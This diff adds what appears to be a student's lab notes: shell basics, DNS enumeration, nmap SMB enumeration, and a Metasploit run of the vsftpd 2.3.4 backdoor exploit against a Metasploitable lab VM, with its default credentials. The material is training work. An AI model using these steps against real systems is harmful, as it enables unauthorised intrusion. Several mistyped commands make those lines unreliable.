@@ -1,0 +1,73 @@
+1)Exploring the command line argument
+a)environment variable
+env
+right arrow
+history
+!1
+!!
+b)piping and redirection
+cd ..
+ls
+ls | cat >new.txt
+cat new.txt>>new1.txt
+grep <word name> filename
+cat new.txt
+cat>new.txt replace(cat>>new.txt append)
+(enter data and ^z)
+Cat new.txt
+c)editing file
+mkdir bscit
+touch new.txt
+vi new.txt (i)
+Esc :w and Esc :wq
+Top
+ps
+pu -u
+ps -A
+
+
+2)DNS(Domian Name System)Enumeration
+
+sudo apt-get update
+sudo apt install dnsenum
+dnsenum google.com
+dnsenum google.com -noreverse
+host google.com
+nslookup google.com
+dig google.com
+
+3)SMB(Server Message Block)Enumeration
+
+A)metasploit
+Loin by Username-msfadmin
+password-msfadmin
+ifconfig
+B)Kali Linux
+cd /  
+Sudo passwd root
+ls
+cd usr cd share cd nmap cd scripts
+ls | grep smb
+nmap -sV 192.168.0.106
+nmap --script smb-enum-users.nes -p445 192.168.0.106
+
+
+5)Vulnerability Scanning with Nmap
+A)metasploit
+Loin by Username-msfadmin
+password-msfadmin
+ifconfig
+B)Kali Linux
+Sudo passwd root
+msfconsole
+nmap -sV 192.168.0.106
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show info
+set RHOSTS 192.168.0.106
+show info
+exploit
+ifconfig
+
+
+
